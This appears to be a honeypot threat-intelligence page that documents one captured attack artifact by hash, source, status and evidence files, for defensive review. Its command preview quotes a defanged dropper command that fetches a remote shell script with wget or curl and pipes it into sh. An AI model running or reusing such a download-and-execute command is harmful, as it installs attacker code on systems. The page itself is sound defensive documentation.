# 76dc35e0ea9ad7d346e1fc9748e1506597a1d99b8d3129a83f2d24c1e292ed93

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `76dc35e0ea9ad7d346e1fc9748e1506597a1d99b8d3129a83f2d24c1e292ed93` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
echo (wget --no-check-certificate -qO- hxxps://14[.]46[.]136[.]XXX/sh || curl -sk hxxps://14[.]46[.]136[.]XXX/sh) | sh -s apache[.]selfr
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
